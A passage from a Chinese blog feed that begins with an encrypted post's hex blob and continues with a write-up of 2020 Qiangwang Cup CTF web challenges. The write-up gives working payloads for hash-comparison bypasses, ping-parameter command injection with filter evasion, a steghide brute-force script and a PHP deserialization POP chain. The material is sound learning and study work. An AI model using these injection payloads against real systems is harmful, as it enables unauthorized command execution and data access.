97972148c851b6bb11ef1100506c43af77bdf68c19e23d22231c618237d1544c2f8db0d3d05a97a5942c808e43981092053940d002cbf5d96a0cf2f3123e7ed2fd21d20a170ae729be01b4f5c5a071afb18f0ea913869b1dcaaa1706694519b522e05cfa3521cb8d98b0c2cb7d4109bca712400a5f836d343efb795a6112d439c3726c967a402ac3d98c94c6fc4bb93b8487884bcff024de156f3c1a96fae06d3873e5abbebd0cd396e28cf3d4265e9758e3b176216e6d7f347c3b08cefbfe300649b46232be86abeda97afa95b91a064bc530d7a3127430f4e02fa9e34191f7a4906470533516c81e728e690d675c7e9116491338537f6cf1ad5ff26549015bc3f54f62658b0a84058f1daf6334ed8e5a0c2db7670e35bc9d0b4a04f606fe6dbe5d8e1f47c482053394d75ff8ad118093d21f8e0802884e9d49d8aeb7e0d8f5189352cf312a147520aa2bf7954feb62a02391f3f3c872d702bb04bb4dcb9ac10d30eb0dcd3ca1e6ad4568e4f067ae7b10fa12da2815fa330b638b368015f0303d5728edc27cd6819ebc84e681b034c9fbd4f557dea2c9eff8bfbfc0d326d4558ce4486c5c395053c655a289a79cb4e63919951af1d153f72dac1ab4d808a76ec2a2b9d0881381b4c22f050e034279baf54aa6b1f6e7aa215d31c9fa9929be4fe1c4af3a64427a8ad03b49f6f2a7066f97f59afaf4ed27c8b8a2abebfdb78695b24ba213772ef18bfa6abbb1082f0469938b053d1a9dcbe3cd60ab0578563a46330db0b8d930f1d0cb461ecbbb06d26c4e3eeb7ec0131adb3b0d374d6c559cee8cab45dc106c926f19982a0d544d2278a7af314455bd3d95a8661412c8914d597143d1ae98d69518b6ecd77474c760501fc46946eea58e51840ac2444355e92761b802c422d2d81d3e77bbe162d88c70bd7d8179c738fef28c670c3a66683461702153e5d3eb5e6d8578313417529ca11b24bea250c8e6f67bace2362faa695a733ae98f547751b9ec51337d2b13618bb6a7823ebb78938987f16c42ee74696edb10e45103329268bbf91a4a58cdafc8fa624e0458f44d0e37070e06e832a1f5a199965fba30aa912a6dfb8f12aff1d6c5c466be46773711e9e876d3f79c914b5cc5adfdfe8b9013eeb14fab44470e1bc27a5e85d00853664bf77b03be6341ce6e69020b4296abe2003c460915b3261e5e83527d70d6310ed7306c416abff9d0e4ae4ee9d4212cd2bd134b7a2bc3b757ade03bf13c6d9124575b0e541e8c441cc5e59df08e9ee9767018b4e0660827f567cfa977aded02d64be02524bf8fdf5b6c644aef249aa27273b0be1fa0fd9dc902da1b4ca44798121981cd37b24c08bd527f99ac13da5adddf926128782051fa52808d8b0a8fb03c0ce0ed5522f4b7daf451403877f7cc61df154e90fb9c6f084f545a7312a7d0644c37a052552323bfc2b5bfa5cc62b9612a7aecbde7fcc98744063f665e1444f0d25c08592601aca507a464f8b4ff969bd3503fa86558995508d2370258aac473d8d3b434d5919891d5cfd783e8c78f19186ffcc7e4c1122dd3bf34cb7ba79f07759d4144c0ef3dcc4fbb84b8d7200f8d0a1a049bc490c4d107897a48e72d11be11e1df3c7efe1df83f563b8741de57859139d8562c41559817dd7f21b9226955c40c18f826d29efd0364171767db2649ab2bcfdb2e0a8f907d172c03e8b9d39816cdf9ec66f9bed0a77bff7ec12f28d7f0d6c14af668bf64ea7b147ed057bf4d8cfd4416762a3a0be4e1308328df6f92b77e2d87dca15182b188a595c40410ea5590beaf9c5b6eb0c6f4765907381128008a3d5491db720b683d3031f0da3c557c9deeba10ff5a3dd9a4ef34edbf8f80e5efe6d3b335150efb2afc5bb30ecd1dbcc0a83c28d37f09af30702d40e00078530731bf08075a16d848b487d1b8777d50cc421175e64c8ec318bfbe97a2f0689c03ad7d0c17fd8d6d529a088959ed63b8f683afd373d271cfbf1ec954ed9f58fe44b87e15ded579db932e62402d559263de8584d3173c98e21ac958188a0d85f8b0f42597b31f84930d7eaca6bb0d4556889c765f98213e824be274f5af0732cd46cde3f7fde9eb60df36dbf7c2aca9137288a1bc72c39b0ec481e6016a273322604a4833f94cdebc3c5586b922c98b01499828802c010151cde66737043e63bfe7026f8fb3a6d98ec22dc8cb29e66dd058c06ad4d7f1157afcc9b185508620cff9fa945f1f02018d1b47e2480cd840ec241769505764f7adccae17ad3ec1d45582fecb3d21173b1e2ed888a27df1b0896d1b5496df248d7ccc7ff39afb3cf427006c7164a9ef7fab328bea6ff952bf67a3aa3d724ed7e7c80d27a73c23f1b06d923dd97cca4b2927e0bc13c0abcad2e835b6e9dd53c91b9c4253521e0466ea86604855d88245fb203feb29c1bca068fceefa33885efc7cd740d5fc493d8d55bbc3f89b075d857dadb0d4f0e0f20aadf8a973e6593802370153133195c1bc08c1bf0070cdc3d76e7e01790ac2360fed5313048e3ea45263e49e9390059bf6f10d9e1487ddb8ceaa7f71c7d3bb7ff7992d27f360657162105b4b0e6ab7189136188ddabb3cf6077abff22ad207edbde68ab2eb3fabefa64df2c940a3b33d9ec325d9f22ed1e3fff82caa222e4f02c99b374165b304e368bd0a12f366d9d9949229d939d00fe86a7919b2000e2875136f0305a1aaf41b82695d317ba4a217ccd966a3afd38da05ef8ddbc666537151b1681585819e01a1f1d98c43b9d246543159559569600a782ffca71639bf5b1ad1bdd98822aba2e3c1372835b1496a03711214fd8d55364a83ffa5a598bd6c602d6d7304a532beb03cdd7c350ed387856e41bc3e37423d127f489bdafaa9ed21ce174f653f214ec402dd3db7e92219</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> encrypt </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020强网杯部分题目复现</title>
      <link href="/posts/e66c142/"/>
      <url>/posts/e66c142/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>代码烂，游戏菜，天天等着大佬带。这次做出来三道题，无缘线下赛了，看来以后要找个大腿抱着才行(开始胡扯ing)</p><h1 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h1><h2 id="Funhash"><a href="#Funhash" class="headerlink" title="Funhash"></a>Funhash</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token single-quoted-string string">'conn.php'</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//level 1</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"hash1"</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"md4"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"hash1"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'level 1 failed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//level 2</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'hash2'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'hash3'</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'hash2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'hash3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'level 2 failed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//level 3</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"SELECT * FROM flag WHERE password = '"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"hash4"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token boolean constant">true</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"'"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>先绕过第一关，需要找到一个特殊字符串，这个特殊的字符串需要满足的条件是经过md4加密后还与它本身相等。这个原本想的是爆破来着，但是太慢了，解题情况又是几十个队伍都解出来了，所以果断放弃爆破的方式。Google一下。(重要设置，设置Google语言为hancker)然后发现了一个大佬的博客中有类似的知识点。<br><a href="https://crdx.org/post/hsctf-2019-md5-minus-minus">https://crdx.org/post/hsctf-2019-md5-minus-minus</a><br>找到了 这个特殊的字符串<code>0e251288019</code><br>提交可以绕过第一关，剩下两个也好绕过了，第二个就是很简单的一个md5绕过，使用数组，第三个是md5的一个特殊情况的字符，刚好比赛前做了一道这样的题，具体参考我的博客<a href="https://blog.csdn.net/qq_45836474/article/details/107940521#t5">https://blog.csdn.net/qq_45836474/article/details/107940521#t5</a><br>总结：构造payload</p><pre class="language-html" data-language="html"><code class="language-html">?hash1=0e251288019&amp;hash2[]=2&amp;hash3[]=3&amp;hash4=ffifdyop</code></pre><p><img src="https://img-blog.csdnimg.cn/20200824144620776.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h2 id="主动"><a href="#主动" class="headerlink" title="主动"></a>主动</h2><p>考点：命令执行</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"ip"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"no flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"ping -c 3 <span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span>ip<span class="token punctuation">]</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </code></pre><p>get方式提交IP参数，但是参数中不能有flag存在，是匹配的flag字符串，所以是黑名单绕过flag就行。<br>payload<code>?ip=127.0.0.1|ls</code>看到两个文件分别是flag.php和index.php<br><img src="https://img-blog.csdnimg.cn/20200824144649904.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><p>经过测试发现空格也被过滤，使用<code>%20</code>来绕过空格。<br>构造payload</p><pre class="language-bash" data-language="bash"><code class="language-bash">?ip<span class="token operator">=</span><span class="token number">127.0</span>.0.1<span class="token operator">|</span>cat%20fl<span class="token string">""</span>ag.php</code></pre><p>执行命令查看源码，flag在源码中。<br><img src="https://img-blog.csdnimg.cn/20200824144709672.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_2FFFFF,t_70#pic_center" alt="m0re" loading="lazy"></p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>题目附件是数据包，wireshark打开，看到有http请求，先导出http对象看到了两个文件，一个html文件还有个php文件。<br><img src="https://img-blog.csdnimg.cn/20200824145410263.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>html的内容是</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>steghide.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span>          <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>文件名:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token comment">&lt;!--i use steghide with a good password--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>注释一个好密码。<br>图片没有导出来，原本尝试直接复制出来16进制出来直接新建图片，结果失败了。这次学到一个新的方式，<br><img src="https://img-blog.csdnimg.cn/20200824151450831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>可以导出一个jpg图片，<br><img src="https://img-blog.csdnimg.cn/20200824152057689.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>然后使用steghide继续解题。没有提示密码的，思路是：上面的注释可以找一下，或者文件名，再然后就是弱口令。<br>这个是个弱口令，<code>123456</code><br><img src="https://img-blog.csdnimg.cn/20200824151831326.png#pic_center" alt="m0re" loading="lazy"><br>不过这个方法不是很稳，不能每次都猜中，所以github上有个工具是暴力破解的。<br><img src="https://img-blog.csdnimg.cn/20200824162446392.png#pic_center" alt="m0re" loading="lazy"><br>一个sh脚本</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">for</span> <span class="token for-or-select variable">line</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> $2<span class="token variable">`</span></span><span class="token punctuation">;</span><span class="token keyword">do</span>    steghide extract -sf <span class="token variable">$1</span> -p <span class="token variable">$line</span> <span class="token operator">></span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$?</span> -eq <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">then</span>        <span class="token builtin class-name">echo</span> <span class="token string">'password is: '</span><span class="token variable">$line</span>        <span class="token builtin class-name">exit</span>    <span class="token keyword">fi</span>  <span class="token keyword">done</span> </code></pre><p>tip：如果是自己创建的文件写入脚本，记得提升脚本权限为可执行。<br>还有其他脚本，不过我感觉这个看起来少hh</p><h2 id="web辅助"><a href="#web辅助" class="headerlink" title="web辅助"></a>web辅助</h2><p>这题是构造pop链，没做过这类题目，所以看的时候有些吃力，这次以后多找几个这类的题目做做总结一下。参考博客——<a href="https://ama666.cn/2020/06/25/DASCTF-6%E6%9C%88%E8%B5%9B%E6%80%BB%E7%BB%93/#phpnus">DASCTF6月赛总结—phpnus</a><br>题目附件中源码给出<a href="https://www.lanzoux.com/iYo2hg0lb9c">点击打包</a><br>class.php中可以三个类中涉及的陌生函数先查一查，</p><ol><li><code>__construct()</code> 函数创建一个新的 SimpleXMLElement 对象。</li><li><code>gettype()</code> 函数用于获取变量的类型。</li><li><code>__destruct() </code>　——对象的所有引用都被删除或者当对象被显式销毁时执行(其实就是析构函数)，有几个更有趣的说法，钟馗的被动，被击杀后的那一下。也可以说是写遗嘱。挺有意思，还是网友的脑洞比较大。</li><li><code>__wakeup()</code>，先说一下sleep函数，在序列化时，<code>serialize()</code> 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>。如果存在，则该方法会优先被调用，然后才执行序列化操作。当然<code>__wakeup()</code>就是与之相反的反序列化时，<code>unserialize()</code>函数同样会检测<code>__wakeup()</code>函数的存在，然后先执行<code>__wakeup()</code>函数的内容。在进行反序列化。</li><li><code>__invoke()</code>，调用函数的方式调用一个对象时的回应方法</li></ol><p>还有构造pop链的时候一下需要注意的点。</p><blockquote><p>private变量序列化后需要在变量名的左右手动添加不可见字符<code>%00</code>，<br>protected变量序列化后需要在变量前的星号<code>*</code>左右手动添加不可见字符，使<br>其成为<code>%00*%00</code>。</p></blockquote><p>下面就开始进行解题了。<br>class.php中的三个类需要cat flag，就需要从输入开始进行嵌套<br><img src="https://img-blog.csdnimg.cn/20200825223232364.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>先看这个，下面的<code>__toString()</code>函数被调用了，cat flag的命令才可以执行。所以需要先调用jungle类中的魔术方法函数。<br>继续看上面的，<br><img src="https://img-blog.csdnimg.cn/20200825224101851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>在topsolo类中，实例化一个对象，然后调用它，把它当作函数来调用，最后进行析构。<br>并且这个在下面的类中就可以进行new一个对象来调用，就可以触发midsolo中的魔术方法——invoke函数<br><img src="https://img-blog.csdnimg.cn/20200825224811489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>最后在jungle类中new一个对象，触发toString函数，并牵连至cat flag的作用。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">topsolo</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token double-quoted-string string">"Riven"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">midsolo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">midsolo</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">jungle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">jungle</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"Lee Sin"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$lol</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">topsolo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$lol</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>构造出来的pop链</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"topsolo"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"%00*%00name"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"midsolo"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"%00*%00name"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"jungle"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"%00*%00name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"Lee Sin"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>同样的，在index.php中，对player这个类进行了序列化，并write进文件中<br><img src="https://img-blog.csdnimg.cn/20200825225342359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_1FFFFF,t_70#pic_center" alt="m0re" loading="lazy"><br>对player进行序列化</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">player</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$user</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$pass</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">user</span> <span class="token operator">=</span> <span class="token variable">$user</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">pass</span> <span class="token operator">=</span> <span class="token variable">$pass</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">admin</span> <span class="token operator">=</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">admin</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$lol</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">player</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$lol</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>结果为：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"player"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"%00*%00user"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"%00*%00pass"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"%00*%00admin"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>然后看到player.php看到读取操作，将读取到文件中的内容进行反序列化<br><img 